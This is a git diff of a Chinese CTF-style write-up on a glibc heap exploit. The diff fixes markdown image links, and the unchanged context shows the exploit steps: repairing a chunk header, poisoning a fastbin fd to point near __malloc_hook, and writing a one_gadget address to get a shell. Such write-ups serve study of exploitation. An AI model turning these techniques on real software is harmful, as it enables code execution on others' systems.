@@ -131,13 +131,13 @@ gdb-peda$ x /64wx (long long)&main_arena -0x50 +0xd
 ```
 delete(1)
 ```
-!(free)[img/free.PNG]<br>
+![free](img/free.PNG)<br>
 可以从上图中看到，chunk2原本的size是0x70(malloc(0x68),分配了0x60的data+0x10的header),由于切割fake unsorted chunk导致chunk2的header被破坏，所以这里第一步是修复chunk2的header<br>
 如果直接free(chunk2),会发生double free的错误，因为fake unsorted chunk 本身就处于free的状态<br>
 ```
 new(0xa0, 'E'*0x98 + p64(0x70))
 ```
-!(fix)[img/fix.PNG]<br>
+![fix](img/fix.PNG)<br>
 
 #### 2.free(chunk2)+修改chunk2的fd
 将chunk2放入fastbin链上，然后修改chunk2的fd,让fd指向天然假的合法的堆块（malloc_hook附近的天然合法假堆块），这样可以对malloc_hook进行写
@@ -148,14 +148,14 @@ malloc_hook=main_arena-0x23-0x10
 new(0xa8,'E'*0x90+p64(0) + p64(0x70) + p64(malloc_hook))#new(chunk1)，写chunk2的fd
 ```
 fastbin效果图
-!(r1)[img/r1.PNG]<br>
-!(place+change)[img/place+change.PNG]<br>
+![r1](img/r1.PNG)<br>
+![place+change](img/place+change.PNG)<br>
 
 #### 3.malloc获取malloc_hook的天然假堆块来写malloc_hook
 ```
 new(0x68, 'A'*0x68)
 new(0x68, 'A'*19 + p64(one_gadget))
 ```
-!(r2)[img/r2.PNG]<br>
+![r2](img/r2.PNG)<br>
 然后随便malloc一下就能getshell了
 
